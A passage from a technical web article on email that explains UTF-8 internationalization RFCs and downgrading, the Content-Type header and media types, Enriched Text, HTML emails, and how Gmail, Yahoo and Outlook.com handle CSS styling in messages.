defines an <a href="#common-smtp-extensions"><abbr title="Simple Mail Transfer Protocol">SMTP</abbr> extension</a> with the keyword <code>SMTPUTF8</code>.
If the <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> server indicates this capability,
the <abbr title="Simple Mail Transfer Protocol">SMTP</abbr> client can transfer a <abbr title="Unicode Transformation Format">UTF</abbr>-8 message with <abbr title="Unicode Transformation Format">UTF</abbr>-8 envelope addresses
by using the <code>MAIL</code> <code>FROM</code> command with the <code>SMTPUTF8</code> parameter.
This <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> also defines <a href="https://datatracker.ietf.org/doc/html/rfc6531#section-4.3">additional protocol types</a>,
which can be used in the <code>with</code> clause of <a href="#trace-information"><code>Received</code> header fields</a>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6532"><strong><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6532</strong></a>
extends the syntax rules of <a href="https://datatracker.ietf.org/doc/html/rfc5322"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 5322</a>
to allow the use of <abbr title="Unicode Transformation Format">UTF</abbr>-8 characters everywhere.
It also introduces an additional <a href="#content-type">content type</a>
with the identifier <code>message/global</code> to describe internationalized messages encoded in <abbr title="Unicode Transformation Format">UTF</abbr>-8.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6533"><strong><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6533</strong></a>
brings <abbr title="Unicode Transformation Format">UTF</abbr>-8 to delivery status notifications (<abbr title="Delivery Status Notifications">DSN</abbr>), such as <a href="#bounce-messages">non-delivery reports (<abbr title="Non-Delivery Report">NDR</abbr>)</a>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6855"><strong><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6855</strong></a>
specifies an <a href="#imap-extensions"><abbr title="Internet Message Access Protocol">IMAP</abbr> extension</a>
which allows mail clients to access internationalized messages
(and to use Unicode characters in folder names).
The <a href="https://datatracker.ietf.org/doc/html/rfc6855#section-3"><code>UTF8=ACCEPT</code> capability</a>
indicates that the <abbr title="Internet Message Access Protocol">IMAP</abbr> server supports <abbr title="Unicode Transformation Format">UTF</abbr>-8 in strings.
The <a href="https://datatracker.ietf.org/doc/html/rfc6855#section-6"><code>UTF8=ONLY</code> capability</a>
indicates that the <abbr title="Internet Message Access Protocol">IMAP</abbr> server requires <abbr title="Unicode Transformation Format">UTF</abbr>-8 support from clients
because it won’t downgrade internationalized messages for them.
The <code>UTF8=ONLY</code> capability implies the <code>UTF8=ACCEPT</code> capability
and clients have to indicate that they can handle <abbr title="Unicode Transformation Format">UTF</abbr>-8
by sending <code>. ENABLE UTF8=ACCEPT</code> to the server.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6856"><strong><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6856</strong></a>
specifies a <a href="#pop3-extensions"><abbr title="Post Office Protocol version 3">POP3</abbr> extension</a>
to upgrade an <abbr title="American Standard Code for Information Interchange">ASCII</abbr>-only session to an <abbr title="Unicode Transformation Format">UTF</abbr>-8 session.
The <abbr title="Post Office Protocol version 3">POP3</abbr> server indicates that it supports <abbr title="Unicode Transformation Format">UTF</abbr>-8 with the
<a href="https://datatracker.ietf.org/doc/html/rfc6856#section-2"><code>UTF8</code> capability</a>.
A <abbr title="Post Office Protocol version 3">POP3</abbr> client can then enable the <abbr title="Unicode Transformation Format">UTF</abbr>-8 mode with the
<a href="https://datatracker.ietf.org/doc/html/rfc6856#section-2.1"><code>UTF8</code> command</a>.
This <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> also introduces a <a href="https://datatracker.ietf.org/doc/html/rfc6856#section-3"><code>LANG</code> capability and command</a>,
which allows the client to configure a different language for the response texts.
This can be useful when the client presents error messages from the server directly to the user.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6857"><strong><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6857</strong></a>
specifies an advanced downgrading mechanism for internationalized messages.
<abbr title="Post Office Protocol version 3">POP3</abbr> and <abbr title="Internet Message Access Protocol">IMAP</abbr> servers can use it to convert <abbr title="Unicode Transformation Format">UTF</abbr>-8 messages to <abbr title="American Standard Code for Information Interchange">ASCII</abbr>-only messages
before delivering them to mail clients which don’t support <abbr title="Unicode Transformation Format">UTF</abbr>-8.
The conversion is relatively straightforward:
Everywhere where the <a href="#header-encoding">Encoded-Word encoding</a> is allowed,
this encoding is used to encode <abbr title="Unicode Transformation Format">UTF</abbr>-8 strings as <abbr title="American Standard Code for Information Interchange">ASCII</abbr> strings.
The Encoded-Word encoding is also used if necessary for
<a href="https://datatracker.ietf.org/doc/html/rfc6857#section-3.2.8">unknown header fields</a>.
<a href="#internationalized-domain-names">Internationalized domain names</a> are downgraded
with the <a href="#punycode-encoding">Punycode encoding</a>.
Email addresses with <a href="https://datatracker.ietf.org/doc/html/rfc6857#section-3.1.8">non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters in the local part</a>
are rewritten by encoding the whole address as an Encoded Word
and replacing the address with an empty <a href="#group-construct">group construct</a>.
For example, <code>From: José &lt;josé@example.com&gt;</code> is <a href="https://www.rfc-editor.org/errata/eid6573">converted to</a>
<code>From: =?UTF-8?Q?Jos=C3=A9_?= =?UTF-8?Q?jos=C3=A9=40example=2Ecom?= :;</code>
thanks to <a href="https://datatracker.ietf.org/doc/html/rfc6854"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6854</a>.
Since this string encodes an empty group instead of an address,
the recipient cannot reply to such a message without manual intervention.
<a href="https://datatracker.ietf.org/doc/html/rfc6857#section-2"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6857</a> requires the use of <code>UTF-8</code> as the character encoding
and <a href="https://datatracker.ietf.org/doc/html/rfc2047#section-5"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2047</a> requires that
the @ symbol and the period are also encoded when the Encoded Word precedes an address.
If the internationalized email address is part of an address group,
the whole group is encoded with this technique because groups cannot be nested.
Header fields in which addresses are used but the group syntax is not allowed
need to be <a href="https://datatracker.ietf.org/doc/html/rfc6857#section-3.1.10">encapsulated</a>:
A header field such as <code>Message-Id</code> is replaced with <code>Downgraded-Message-Id</code>
so that its value can be encoded as an Encoded Word.
The <code>Received</code> header fields are an exception to this rule:
Any clauses with non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters are <a href="https://datatracker.ietf.org/doc/html/rfc6857#section-3.2.4">simply removed</a>.
Lastly, the message body is <a href="https://datatracker.ietf.org/doc/html/rfc6857#appendix-A">left as is</a>,
even if the <a href="#content-encoding">content transfer encoding</a> is <code>8bit</code>.</li>
    <li><a href="https://datatracker.ietf.org/doc/html/rfc6858"><strong><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6858</strong></a>
specifies a simpler downgrading mechanism for internationalized messages,
which accepts the loss of information in favor of an easier implementation.
Internationalized email addresses are replaced with an
<a href="https://datatracker.ietf.org/doc/html/rfc6858#section-2.1">invalid address</a>,
such as <code>invalid@internationalized.invalid</code>.
The original address can optionally be encoded in the <a href="#display-name">display name</a> of the invalid address.
The <a href="#subject">subject field</a> is encoded as an Encoded Word,
and all other header fields with non-<abbr title="American Standard Code for Information Interchange">ASCII</abbr> characters are simply removed.
This <abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> also extends <a href="#internet-message-access-protocol"><abbr title="Internet Message Access Protocol">IMAP</abbr></a>
so that the server can indicate to the client which messages were downgraded.
In order to prevent permanent loss of information,
mail clients shouldn’t remove the internationalized message on the server.
Automatically removing retrieved messages on the server is especially common
among <a href="#post-office-protocol-version-3"><abbr title="Post Office Protocol version 3">POP3</abbr></a> clients.
Another problem is that clients often cache messages indefinitely.
Even if the client is upgraded to support internationalized messages,
it likely still accesses the downgraded messages from the <a href="#storage-format">local message store</a>.
Last but not least, downgrading message header fields invalidates <a href="#domainkeys-identified-mail"><abbr title="DomainKeys Identified Mail">DKIM</abbr> signatures</a>.</li>
  </ul>

</details>

<h3 id="content-type">Content type</h3>

<p>Now that we can <a href="#content-encoding">encode arbitrary content</a>,
we need a way to inform the client how to interpret the decoded content.
This is done with the <a href="https://datatracker.ietf.org/doc/html/rfc2045#section-5"><code>Content-Type</code> header field</a>,
which has the following format:</p>

<figure>

  <div><div><pre><code>Content-Type: {Type}/[{Tree}.]{Subtype}[+{Suffix}][; {Parameter}]*
</code></pre></div>  </div>

  <figcaption>

The <a href="https://en.wikipedia.org/wiki/Bracket#Curly_brackets">curly brackets</a> need to be replaced as described below,
the content in the <a href="https://en.wikipedia.org/wiki/Bracket#Square_brackets">square brackets</a> is optional,
and the <a href="https://en.wikipedia.org/wiki/Asterisk">asterisk</a> indicates that there may be several parameters.

</figcaption>
</figure>

<p>The content type is also called <a href="https://en.wikipedia.org/wiki/Media_type">media type</a>.
<a href="https://en.wikipedia.org/wiki/Internet_Assigned_Numbers_Authority"><abbr title="Internet Assigned Numbers Authority">IANA</abbr></a> maintains a long list
of <a href="https://www.iana.org/assignments/media-types/media-types.xhtml">registered media types</a>.
A content type consists of:</p>
<ul>
  <li><code>Type</code>: The primary content type describes the general type of data.
If the client doesn’t recognize the subtype,
it can use this information to decide what to do with the content.
If the type is <a href="https://datatracker.ietf.org/doc/html/rfc2046#section-4.1"><code>text</code></a>,
for example, it can display the raw data to the user,
which wouldn’t make sense for <a href="https://en.wikipedia.org/wiki/Binary_file">binary files</a>.
The other top-level media types are <a href="https://datatracker.ietf.org/doc/html/rfc2046#section-4.2"><code>image</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc2046#section-4.3"><code>audio</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc2046#section-4.4"><code>video</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc8081"><code>font</code></a>,
<a href="https://datatracker.ietf.org/doc/html/rfc2077"><code>model</code></a> for three-dimensional models,
<a href="https://datatracker.ietf.org/doc/html/rfc2046#section-4.5"><code>application</code></a> for application-specific formats,
<a href="https://datatracker.ietf.org/doc/html/rfc2046#section-5.2"><code>message</code></a> for <a href="#format">email messages</a>,
<a href="https://datatracker.ietf.org/doc/html/rfc2046#section-5.1"><code>multipart</code></a> for <a href="#multipart-messages">multipart messages</a>,
and <a href="https://datatracker.ietf.org/doc/html/rfc4735"><code>example</code></a> for use in documentation.</li>
  <li><code>Tree</code>: <a href="https://datatracker.ietf.org/doc/html/rfc6838"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6838</a> defines four registration trees
in order to keep different kinds of subtypes apart.
There is the <a href="https://datatracker.ietf.org/doc/html/rfc6838#section-3.1">standards tree</a>,
which doesn’t use a tree prefix and is reserved for formats specified
by a <a href="https://en.wikipedia.org/wiki/Standards_organization">standards organization</a>
such as <a href="https://en.wikipedia.org/wiki/Internet_Engineering_Task_Force"><abbr title="Internet Engineering Task Force">IETF</abbr></a>;
the <a href="https://datatracker.ietf.org/doc/html/rfc6838#section-3.2">vendor tree</a> with the prefix <code>vnd.</code>
for <a href="https://en.wikipedia.org/wiki/Proprietary_format">proprietary formats</a>;
the <a href="https://datatracker.ietf.org/doc/html/rfc6838#section-3.3">personal or vanity tree</a> with the prefix <code>prs.</code>
for experimental and non-commercial formats;
and the <a href="https://datatracker.ietf.org/doc/html/rfc6838#section-3.4">unregistered tree</a> with the prefix <code>x.</code>
for unregistered and thus only locally used formats.</li>
  <li><code>Subtype</code>: The subtype is the name of the content type.
See the list of examples below.</li>
  <li><code>Suffix</code>: A <a href="https://datatracker.ietf.org/doc/html/rfc6838#section-6">structured syntax suffix</a>
can be used to specify the syntax of the media type
while leaving the semantics of the data to the subtype.
<abbr title="Internet Assigned Numbers Authority">IANA</abbr> maintains a list of <a href="https://www.iana.org/assignments/media-type-structured-suffix/media-type-structured-suffix.xhtml">registered suffixes</a>.
Examples are <code>+xml</code>, <code>+json</code>, and <code>+zip</code>.</li>
  <li><code>Parameter</code>: Parameters can be used to modify the media type.
Each subtype specifies which parameters are required and which ones are optional.
Optional parameters assume their default value if they are not provided.
If several parameters are provided,
their <a href="https://datatracker.ietf.org/doc/html/rfc2046#section-1">ordering is irrelevant</a>,
but each parameter may appear <a href="https://datatracker.ietf.org/doc/html/rfc6838#section-4.3">only once</a>.
The <a href="https://datatracker.ietf.org/doc/html/rfc2045#section-5.1">syntax of parameters</a> is <code>name=value</code>.
The best-known parameter is <code>charset</code> to specify the <a href="#character-encoding">character encoding</a> of <code>text</code> content.
<abbr title="Internet Assigned Numbers Authority">IANA</abbr> maintains the <a href="https://www.iana.org/assignments/character-sets/character-sets.xhtml">standardized character sets</a> and
the <a href="https://www.iana.org/assignments/media-type-sub-parameters/media-type-sub-parameters.xhtml">values of some parameters</a>.</li>
</ul>

<p>The type, the subtype, and the parameter names are case-insensitive.
<a href="https://datatracker.ietf.org/doc/html/rfc6838"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 6838</a> doesn’t specify whether the tree and the suffix are also case-insensitive
but I assume that this is the case.
Whether a parameter value is case sensitive depends on the parameter.
The <a href="https://datatracker.ietf.org/doc/html/rfc2045#section-5.2">default content type for emails</a>
is <code>text/plain; charset=us-ascii</code>.
As specified in <a href="https://datatracker.ietf.org/doc/html/rfc1945#section-3.6"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1945</a>,
<a href="https://evalapply.org/internet/#hypertext-transfer-protocol"><abbr title="HyperText Transfer Protocol">HTTP</abbr></a> uses the same header field with the same media types.</p>

<p>Example content types: <code>text/csv</code>, <code>text/html</code>, <code>image/png</code>, <code>image/svg+xml</code>,
<code>image/vnd.adobe.photoshop</code>, <code>audio/mpeg</code>, <code>video/mp4</code>, <code>font/otf</code>,
<code>application/javascript</code>, <code>application/pdf</code>, <code>application/vnd.apple.pages</code>, and <code>application/vnd.ms-excel</code>.</p>

<details>
  <summary id="enriched-text">
Enriched Text
</summary>

  <p>The ability to send <a href="https://en.wikipedia.org/wiki/Formatted_text">formatted text</a>
was first introduced <a href="https://datatracker.ietf.org/doc/html/rfc1341#page-23">in 1992</a> with a content type of <code>text/richtext</code>.
In order to avoid confusion with Microsoft’s <a href="https://en.wikipedia.org/wiki/Rich_Text_Format">Rich Text Format (<abbr title="Rich Text Format">RTF</abbr>)</a>,
the content type was renamed to <code>text/enriched</code> the <a href="https://datatracker.ietf.org/doc/html/rfc1523">following year</a>
and revised again in <a href="https://datatracker.ietf.org/doc/html/rfc1896"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 1896</a>.
<a href="https://en.wikipedia.org/wiki/Enriched_text">Enriched Text</a> is a
<a href="https://en.wikipedia.org/wiki/Markup_language">markup language</a>
with <a href="https://en.wikipedia.org/wiki/HTML_element#Syntax"><abbr title="HyperText Markup Language">HTML</abbr>-like tags</a>.
Let’s look at a simple example:</p>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: text/enriched; charset=us-ascii

&lt;bold&gt;Roses&lt;/bold&gt; &lt;italic&gt;are&lt;/italic&gt;
&lt;color&gt;&lt;param&gt;red&lt;/param&gt;red&lt;/color&gt;.
</code></pre></div>    </div>

    <figcaption>
An example Enriched Text message.
<a href="#tool-protocol-esmtp&amp;content=text%2Fenriched&amp;body=%3Cbold%3ERoses%3C%2Fbold%3E+%3Citalic%3Eare%3C%2Fitalic%3E%0A%3Ccolor%3E%3Cparam%3Ered%3C%2Fparam%3Ered%3C%2Fcolor%3E." title="Set the body of the ESMTP tool to this Enriched Text example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
</figcaption>
  </figure>

  <p>This data format has mostly been superseded by <a href="#html-emails"><abbr title="HyperText Markup Language">HTML</abbr></a> and is not widely supported.
Apple Mail strips all the tags and displays the text without formatting.
Gmail doesn’t recognize the format and offers the option to download the content instead.
Only Thunderbird displays the text with formatting, but it doesn’t support the <code>&lt;color&gt;</code> tag.</p>

</details>

<details>
  <summary id="html-emails">
<abbr title="HyperText Markup Language">HTML</abbr> emails
</summary>

  <p>Nowadays, most messages are formatted with the <a href="https://en.wikipedia.org/wiki/HTML">Hypertext Markup Language (<abbr title="HyperText Markup Language">HTML</abbr>)</a>.
The <code>text/html</code> media type is specified in <a href="https://datatracker.ietf.org/doc/html/rfc2854"><abbr title="Request for Comments, published by the Internet Engineering Task Force (IETF)">RFC</abbr> 2854</a>.
The message from the <a href="#enriched-text">previous box</a> looks as follows when it is formatted with <abbr title="HyperText Markup Language">HTML</abbr>:</p>

  <figure>

    <div><div><pre><code>MIME-Version: 1.0
Content-Type: text/html; charset=us-ascii

&lt;html&gt;
  &lt;body&gt;
    &lt;b&gt;Roses&lt;/b&gt; &lt;i&gt;are&lt;/i&gt;
    &lt;span style=&#34;color:red;&#34;&gt;red&lt;/span&gt;.
  &lt;/body&gt;
&lt;/html&gt;
</code></pre></div>    </div>

    <figcaption>
An example <abbr title="HyperText Markup Language">HTML</abbr> message.
<a href="#tool-protocol-esmtp&amp;content=text%2Fhtml&amp;body=%3Chtml%3E%0A++%3Cbody%3E%0A++++%3Cb%3ERoses%3C%2Fb%3E+%3Ci%3Eare%3C%2Fi%3E%0A++++%3Cspan+style%3D%22color%3Ared%3B%22%3Ered%3C%2Fspan%3E.%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E" title="Set the body of the ESMTP tool to this HTML example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
</figcaption>
  </figure>

  <p>This example works as intended in Apple Mail, Gmail, and Thunderbird.
We’ll discuss in the <a href="#email-styling">next box</a> how to style <a href="https://en.wikipedia.org/wiki/HTML_email"><abbr title="HyperText Markup Language">HTML</abbr> emails</a>.
For security reasons, mail clients don’t execute sender-provided <a href="https://en.wikipedia.org/wiki/JavaScript">JavaScript</a>.
Gmail and some other mailbox providers still support <a href="#dynamic-content">dynamic content</a>, though.
Furthermore, <abbr title="HyperText Markup Language">HTML</abbr> messages cause serious <a href="#remote-content">privacy issues</a>, which I’ll cover later.</p>

</details>

<details>
  <summary id="email-styling">
Email styling
</summary>

  <p><abbr title="HyperText Markup Language">HTML</abbr> is styled with <a href="https://en.wikipedia.org/wiki/Cascading_Style_Sheets">Cascading Style Sheets (<abbr title="Cascading Style Sheets">CSS</abbr>)</a>.
There are <a href="https://www.w3schools.com/CSS/css_howto.asp">three ways</a> to add <abbr title="Cascading Style Sheets">CSS</abbr> to an <abbr title="HyperText Markup Language">HTML</abbr> page:</p>

  <figure>

    <div><div><pre><code><span>&lt;html&gt;</span>
  <span>&lt;head&gt;</span>
    <span>&lt;link</span> <span>rel=</span><span>&#34;stylesheet&#34;</span> <span>href=</span><span>&#34;styles.css&#34;</span><span>&gt;</span>
  <span>&lt;/head&gt;</span>
  <span>&lt;body&gt;</span>
    <span>&lt;span&gt;</span>Hello,<span>&lt;/span&gt;</span>
    <span>&lt;span&gt;</span>World!<span>&lt;/span&gt;</span>
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div>    </div>

    <figcaption>

<strong>External <abbr title="Cascading Style Sheets">CSS</abbr></strong>: Load an external style sheet with a
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link"><code>&lt;link&gt;</code> element</a>.

</figcaption>
  </figure>

  <figure>

    <div><div><pre><code><span>&lt;html&gt;</span>
  <span>&lt;head&gt;</span>
    <span>&lt;style </span><span>type=</span><span>&#34;text/css&#34;</span><span>&gt;</span>
      <span>span</span> <span>{</span>
        <span>color</span><span>:</span> <span>red</span><span>;</span>
      <span>}</span>
    <span>&lt;/style&gt;</span>
  <span>&lt;/head&gt;</span>
  <span>&lt;body&gt;</span>
    <span>&lt;span&gt;</span>Hello,<span>&lt;/span&gt;</span>
    <span>&lt;span&gt;</span>World!<span>&lt;/span&gt;</span>
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div>    </div>

    <figcaption>

<strong>Internal <abbr title="Cascading Style Sheets">CSS</abbr></strong>: Embed the style with a
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/style"><code>&lt;style&gt;</code> element</a>
inside the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/head"><code>&lt;head&gt;</code> element</a>.

</figcaption>
  </figure>

  <figure>

    <div><div><pre><code><span>&lt;html&gt;</span>
  <span>&lt;body&gt;</span>
    <span>&lt;span</span> <span>style=</span><span>&#34;color: red;&#34;</span><span>&gt;</span>Hello,<span>&lt;/span&gt;</span>
    <span>&lt;span</span> <span>style=</span><span>&#34;color: red;&#34;</span><span>&gt;</span>World!<span>&lt;/span&gt;</span>
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div>    </div>

    <figcaption>

<strong>Inline <abbr title="Cascading Style Sheets">CSS</abbr></strong>: Repeat the style with the
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/style"><code>style</code> attribute</a> for every element.

</figcaption>
  </figure>

  <p>The problem with <abbr title="HyperText Markup Language">HTML</abbr> and <abbr title="Cascading Style Sheets">CSS</abbr> in emails is that the support for them varies a lot among mail clients.
As a sender, you want to make sure that your message is displayed as intended for most of your recipients.
This forces you to use only features which are supported by most mail clients.
While some mail clients <a href="https://www.campaignmonitor.com/css/link-element/link-in-head/">support external <abbr title="Cascading Style Sheets">CSS</abbr></a>,
many do not.
And while many mail clients <a href="https://www.campaignmonitor.com/css/style-element/style-in-head/">support internal <abbr title="Cascading Style Sheets">CSS</abbr></a>
by now, some do not.
For this reason, most <abbr title="HyperText Markup Language">HTML</abbr> emails are still sent with inline <abbr title="Cascading Style Sheets">CSS</abbr>,
which is supported by all mail clients that can display <abbr title="HyperText Markup Language">HTML</abbr> emails.
By the way, you don’t have to inline the <abbr title="Cascading Style Sheets">CSS</abbr> manually,
there are <a href="https://htmlemail.io/inline/">tools for that</a>.</p>

  <p>Since <a href="https://www.litmus.com/blog/gmail-to-support-responsive-email-design/">Gmail started supporting internal <abbr title="Cascading Style Sheets">CSS</abbr></a>
in 2016, all <a href="https://emailclientmarketshare.com/">major mail clients</a> support it.
It seems that we can finally stop inlining styles in emails.
Unfortunately, the situation is still worse than it seems.
<a href="#webmail">Webmail clients</a>, such as <a href="https://gmail.com">gmail.com</a>,
<a href="https://mail.yahoo.com">yahoo.com</a>, and <a href="https://outlook.com">outlook.com</a>,
embed the <abbr title="HyperText Markup Language">HTML</abbr> of messages inside the <abbr title="HyperText Markup Language">HTML</abbr> of their websites without using an
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe"><code>&lt;iframe&gt;</code> element</a>.
Instead, they remove the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/html"><code>&lt;html&gt;</code></a>,
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/head"><code>&lt;head&gt;</code></a>,
and <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/body"><code>&lt;body&gt;</code></a> elements
from the message and rewrite the internal <abbr title="Cascading Style Sheets">CSS</abbr> so that it applies only within the
<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/div"><code>&lt;div&gt;</code> element</a> of the message.
As <a href="https://www.hteumeuleu.com/2017/should-we-stop-inlining-styles-in-emails/">others have noted</a>,
Gmail does a bad job at this.
Let’s look at an example:</p>

  <figure>

    <div><div><pre><code><span>&lt;html&gt;</span>
  <span>&lt;head&gt;</span>
    <span>&lt;style </span><span>type=</span><span>&#34;text/css&#34;</span><span>&gt;</span>
      <span>a</span> <span>{</span> <span>color</span><span>:</span> <span>red</span><span>;</span> <span>}</span>
    <span>&lt;/style&gt;</span>
  <span>&lt;/head&gt;</span>
  <span>&lt;body&gt;</span>
    <span>&lt;a</span> <span>href=</span><span>&#34;https://en.wikipedia.org/wiki/Roses_Are_Red&#34;</span><span>&gt;</span>Roses are red<span>&lt;/a&gt;</span>.
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div>    </div>

    <figcaption>
Styling the color of links.
<a href="#tool-protocol-esmtp&amp;content=text%2Fhtml&amp;body=%3Chtml%3E%0A++%3Chead%3E%0A++++%3Cstyle+type%3D%22text%2Fcss%22%3E%0A++++++a+%7B+color%3A+red%3B+%7D%0A++++%3C%2Fstyle%3E%0A++%3C%2Fhead%3E%0A++%3Cbody%3E%0A++++%3Ca+href%3D%22https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FRoses_Are_Red%22%3ERoses+are+red%3C%2Fa%3E.%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E" title="Set the body of the ESMTP tool to this HTML example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
</figcaption>
  </figure>

  <p>When you send the above message to your Gmail account and view the message in your browser,
you’ll see that the link is colored in Gmail’s default blue.
If you inspect the <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a"><code>&lt;a&gt;</code> element</a> with the
<a href="https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_are_browser_developer_tools">developer tools</a>
of your browser, you’ll see why:</p>

  <figure>

    <div><div><pre><code><span>/* Gmail&#39;s default style: */</span>
<span>.ii</span> <span>a</span><span>[</span><span>href</span><span>]</span> <span>{</span>
    <span>color</span><span>:</span> <span>#15c</span><span>;</span>
<span>}</span>

<span>/* Rewritten custom style: */</span>
<span>.msg443033220466499195</span> <span>a</span> <span>{</span>
    <span>color</span><span>:</span> <span>red</span><span>;</span>
<span>}</span>
</code></pre></div>    </div>

    <figcaption>
The styles that Gmail applies to the link in the above message.
</figcaption>
  </figure>

  <p>The problem is that the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity">specificity</a>
of Gmail’s default style is higher than the one of the custom style
because of the <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Attribute_selectors">attribute selector</a>.
Using <code>a[href]</code> yourself doesn’t work because
<a href="https://developers.google.com/gmail/design/css#css_selectors">Gmail supports only class, element, and ID selectors</a>.
You can solve the problem either by
using <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Specificity#the_!important_exception"><code>!important</code></a>
on your style (<code>a { color: red !important; }</code>) or by wrapping the message with an ID:</p>

  <figure>

    <div><div><pre><code><span>&lt;html&gt;</span>
  <span>&lt;head&gt;</span>
    <span>&lt;style </span><span>type=</span><span>&#34;text/css&#34;</span><span>&gt;</span>
      <span>#body</span> <span>a</span> <span>{</span> <span>color</span><span>:</span> <span>red</span><span>;</span> <span>}</span>
    <span>&lt;/style&gt;</span>
  <span>&lt;/head&gt;</span>
  <span>&lt;body&gt;</span>
    <span>&lt;div</span> <span>id=</span><span>&#34;body&#34;</span><span>&gt;</span>
      <span>&lt;a</span> <span>href=</span><span>&#34;https://en.wikipedia.org/wiki/Roses_Are_Red&#34;</span><span>&gt;</span>Roses are red<span>&lt;/a&gt;</span>.
    <span>&lt;/div&gt;</span>
  <span>&lt;/body&gt;</span>
<span>&lt;/html&gt;</span>
</code></pre></div>    </div>

    <figcaption>

How to solve Gmail’s link rendering problem.
<a href="#tool-protocol-esmtp&amp;content=text%2Fhtml&amp;body=%3Chtml%3E%0A++%3Chead%3E%0A++++%3Cstyle+type%3D%22text%2Fcss%22%3E%0A++++++%23body+a+%7B+color%3A+red%3B+%7D%0A++++%3C%2Fstyle%3E%0A++%3C%2Fhead%3E%0A++%3Cbody%3E%0A++++%3Cdiv+id%3D%22body%22%3E%0A++++++%3Ca+href%3D%22https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FRoses_Are_Red%22%3ERoses+are+red%3C%2Fa%3E.%0A++++%3C%2Fdiv%3E%0A++%3C%2Fbody%3E%0A%3C%2Fhtml%3E" title="Set the body of the ESMTP tool to this HTML example.">Click here</a>
to use this example in the <a href="#esmtp-tool"><abbr title="Extended/Enhanced Simple Mail Transfer Protocol">ESMTP</abbr> tool</a> above.
While the <a href="https://www.campaignmonitor.com/css/selectors/id/">ID</a> and the
<a href="https://www.campaignmonitor.com/css/selectors/descendant/">descendant</a> selectors are supported by almost everyone,
the <a href="https://www.campaignmonitor.com/css/selectors/child/">child selector</a> is not.

</figcaption>
  </figure>

  <p>Since <a href="https://specifishity.com/">inline styles are more specific</a>,
you can keep inlining your <abbr title="Cascading Style Sheets">CSS</abbr> styles to avoid this problem.
Yahoo.com and Outlook.com do a better job than Gmail.
Yahoo rewrites the custom style to <code>#yiv4554178645 a</code>,
which overrides the default <code>.msg-body a</code>.
Outlook.com has no default style for the <code>&lt;a&gt;</code> element,
but interestingly, it inlines a brightened color when you activate
its <a href="https://support.microsoft.com/en-us/office/dark-mode-in-outlook-com-and-outlook-on-the-web-391487d7-c2c0-4256-a5af-b49d0b36a645">dark mode</a>.
Personally, I hope that we can abandon inline <abbr title="Cascading Style Sheets">CSS</abbr> for <abbr title="HyperText Markup Language">HTML</abbr> emails soon.
Since emails are <a href="#message-compression">compressed</a> neither in transit nor in storage,
inline styles increase the size of messages significantly.
It also makes <abbr title="HyperText Markup Language">HTML</abbr> messages harder to read in their <a href="#raw-message">raw form</a>.
Moreover, <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Media_Queries/Using_media_queries">media queries</a>
